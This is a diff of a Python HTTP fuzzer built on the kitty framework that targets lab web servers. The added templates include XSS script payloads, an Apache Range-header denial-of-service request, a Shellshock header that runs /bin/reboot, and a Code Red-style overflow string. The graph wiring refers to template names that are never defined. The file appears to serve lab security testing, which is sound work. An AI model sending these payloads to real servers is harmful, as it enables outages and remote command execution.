@@ -1,7 +1,5 @@
 #!/usr/bin/python
 
-
-
 import socket
 import os
 import sys
@@ -16,13 +14,27 @@ from katnip.controllers.client.process import ClientProcessController
 from kitty.controllers.empty import EmptyController
 from kitty.controllers.base import BaseController
 from kitty.controllers.client import ClientController
-
 from kitty.model import *
 #==================================================================
-# Methods
+'''	
+Test Cases
+Server		Host				Port
 
+apache2:	192.168.146.131		80
+caddy: 		192.168.146.131		2015
+jexus: 		192.168.146.131		2016
+monkey:		192.168.146.131		2017
+lighttpd:	192.168.146.131		2018
+'''
 
+NAME="target"
+HOST="192.168.146.131"
+PORT=2015
 
+URL="http://"+HOST
+
+#==================================================================
+# Models
 http_get_01 = Template(name='HTTP_GET_01', fields=[
     String('GET', name='method'),           # 1. Method - a string with the value "GET"
     Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
@@ -35,7 +47,7 @@ http_get_01 = Template(name='HTTP_GET_01', fields=[
 
 
 
-http_get_02 = Template(name='HTTP_GET_01', fields=[
+http_get_02 = Template(name='HTTP_GET_02', fields=[
     String('GET', name='method'),           # 1. Method - a string with the value "GET"
     Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
     String('/doc', name='path1'),     # 2. Path - a string with the value "/index.html"
@@ -46,7 +58,7 @@ http_get_02 = Template(name='HTTP_GET_01', fields=[
 ])
 
 
-http_get_03 = Template(name='HTTP_GET_01', fields=[
+http_get_03 = Template(name='HTTP_GET_03', fields=[
     String('GET', name='method'),           # 1. Method - a string with the value "GET"
     Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
     String('/index.html', name='path1'),     # 2. Path - a string with the value "/index.html"
@@ -70,7 +82,7 @@ http_post_01 = Template(name='HTTP_POST_01', fields=[
 #==================================================================
 # Request- URI
 
-http_req_01 = Template(name='HTTP_GET_V1', fields=[
+http_req_01 = Template(name='HTTP_GET_01', fields=[
     String('GET', name='method'),           # 1. Method - a string with the value "GET"
     Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
     String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
@@ -85,10 +97,35 @@ http_req_01 = Template(name='HTTP_GET_V1', fields=[
 
 
 
+http_req_02 = Template(name='HTTP_req_02', fields=[
+	String('GET', name='method'),           # 1. Method - a string with the value "GET"
+	Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+	String('/dir', name='path1'),
+	String('/page', name='path2'),
+	Delimiter('.', name='path3'),
+	String('html', name='path4'),
+	Delimiter('?', name='path5'),
+	String('name1', name='path6'),
+	Delimiter('=', name='path7'),
+	String('value1', name='path8'),
+	Delimiter('&', name='path9'),
+	String('name2', name='path10'),
+	Delimiter('=', name='path11'),
+	String('value2', name='path12'),
+    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
+	String('Host', name='host'), 
+	Delimiter(':', name='colon1'),
+	Delimiter(' ', name='space3'),
+	String('localhost', name='host1'), 
+])
+
+
 #==================================================================
 # XSS
 
-http_xss_01 = Template(name='HTTP_GET_01', fields=[
+http_xss_01 = Template(name='HTTP_XSS_01', fields=[
     String('GET', name='method'),           # 1. Method - a string with the value "GET"
     Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
     String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
@@ -100,13 +137,129 @@ http_xss_01 = Template(name='HTTP_GET_01', fields=[
 
 
 
+http_xss_02 = Template(name='HTTP_XSS_02', fields=[
+    String('GET', name='method'),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
+	String('\"<div><script>alert(1);</script>', name='xss'),
+    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom'),   
+	String('Host: ', name='host'),
+	String(URL, name='url'),
+	Delimiter('\r\n\r\n', name='eom3'),
+	String('Content-type: ', name='ctypeh'),
+	String('text/html', name='ctype'),
+	Delimiter('\r\n\r\n', name='eom4'),
+])
+
+
+http_xss_03 = Template(name='HTTP_XSS_03', fields=[
+    String('GET', name='method'),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
+	String('<input type="button" onclick="createSearchUrl('')" value="Copy url"/>\n', name='xss1'),
+	String('<script>\n', name='xss2'),
+	String("registerStatistics('searchTerm', '');\n", name='xss3'),
+	String('</script>\n', name='xss4'),
+    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom'),   
+	String('Host: ', name='host'),
+	String(URL, name='url'),
+	Delimiter('\r\n\r\n', name='eom3'),
+	String('Content-type: ', name='ctypeh'),
+	String('text/html', name='ctype'),
+	Delimiter('\r\n\r\n', name='eom4'),
+])
+
+
 #==================================================================
-# Cookies
+# Others
 
 
 
-#==================================================================
-# Post-data
+put_head = Template(name='put_head', fields=[
+    String('PUT', name='method'),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
+    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
+    Static('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Static('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
+    Static('Content-Length: ', name='proto'),
+    Dword(182, name='num', encoder=ENC_INT_DEC),
+    String('Hello World!', name='message')
+])
+
+del_head = Template(name='del_head', fields=[
+    String('DELETE', name='method'),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
+    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
+    Static('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Static('\r\n\r\n', name='eom')      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
+])
+
+opt_head = Template(name='opt_head', fields=[
+    String('OPTIONS', name='method'),           # 1. Method - a string with the value "GET"
+    Delimiter(' /', name='space1'),          # 1.a The space between Method and Path
+    String('*', name='path'),     # 2. Path - a string with the value "/index.html"
+    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
+    Static('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Static('\r\n\r\n', name='eom')      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
+])
+
+trace_head = Template(name='trace_head', fields=[
+    String('TRACE', name='method'),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
+    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
+    Static('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Static('\r\n\r\n', name='eom')      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
+])
+
+
+apache_killer = Template(name='apache_killer', fields=[
+	String('HEAD / HTTP/1.1', name='method', fuzzable=False),
+	Delimiter('\r\n\r\n', name='eom1', fuzzable=False),
+	String('Host: ', name='host', fuzzable=False),
+	String('192.168.146.131', name='target', fuzzable=False),
+	Delimiter('\r\n\r\n', name='eom2', fuzzable=False),
+	String('Range: bytes=', name='range', fuzzable=False),
+	Dword(0, name='num1', encoder=ENC_INT_DEC),
+	Static('-', name='dash1'),
+	Dword(0, name='num2', encoder=ENC_INT_DEC),
+	Static(',', name='dash2'),
+	Dword(0, name='num3', encoder=ENC_INT_DEC),
+	Static('-', name='dash3'),
+	Dword(0, name='num4', encoder=ENC_INT_DEC),
+	Static(',', name='dash4'),
+	Dword(0, name='num5', encoder=ENC_INT_DEC),
+	Static('-', name='dash5'),
+	Dword(0, name='num6', encoder=ENC_INT_DEC),
+	Static(',', name='dash6'),
+	Dword(0, name='num7', encoder=ENC_INT_DEC),
+	Static('-', name='dash7'),
+	Dword(0, name='num8', encoder=ENC_INT_DEC),
+	Static(',', name='dash8'),
+	Dword(0, name='num9', encoder=ENC_INT_DEC),
+	Static('-', name='dash9'),
+	Dword(0, name='num0', encoder=ENC_INT_DEC),
+])
+ 
+shell_shock = Template(name='shell_shock', fields=[
+	String('GET / HTTP/1.1', name='method', fuzzable=False),
+	Delimiter('\r\n\r\n', name='eom1', fuzzable=False),
+	String('HTTP_USER_AGENT=() { :; }; /bin/', name='host', fuzzable=False),
+	String('reboot', name='baststuff'),
+])
+ 
+code_red = Template(name='code_red', fields=[
+	Static('GET /default.ida?', name='method file'), String('NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNv', name='padding'),
+	Static(' HTTP/1.1\r\n\r\n', name='protocol name'),
+])
+
+
 
 
 #=====================================================================
@@ -153,7 +306,6 @@ class TcpTarget(ServerTarget):
 			self.socket.close()
 			## set socket to none
 			self.socket = None
-
 
 	def _send_to_target(self, data):
 		print "data:"+ data
@@ -237,17 +389,8 @@ if __name__=="__main__":
 	test_name = 'Server fuzzer 0.1'
 	test_session='fuzz'					# 'test' or 'fuzz'
 
-	'''	
-	apache2:	192.168.146.131		80
-	caddy: 		192.168.146.131		2015
-	jexus: 		192.168.146.131		2016
-	monkey:		192.168.146.131		2017
-	lighttpd:	192.168.146.131		2018
 
-	'''
-	NAME="target"
-	HOST="192.168.146.131"
-	PORT=2015
+
 
 	#---------------------------------------------
 	# initialize fuzzer
@@ -283,9 +426,28 @@ if __name__=="__main__":
 	#---------------------------------------------
 
 	model = GraphModel('model_01')
+
 	model.connect(http_post_01)
-	model.connect(http_post_01, http_req_01)
-	model.connect(http_req_01, http_xss_01)
+	model.connect(http_post_01, http_get_01)
+	model.connect(http_get_01, http_xss_01)
+
+	model.connect(http_post_01, http_get_02)
+	model.connect(http_get_02, http_xss_01)
+
+	model.connect(http_post_01, http_get_03)
+	model.connect(http_get_03, http_xss_01)
+ 
+	model.connect(http_xss_01, http_req_01)
+	model.connect(http_xss_01, http_req_02)
+
+	model.connect(http_req_01, http_xss_02)
+	model.connect(http_req_02, http_xss_02)	
+
+	model.connect(put_head, delete_head)
+	model.connect(delete_head, option_head)
+	model.connect(option_head, trace_head)
+
+	
 
 	#--------------------------------------------
 	# Ready to fuzz
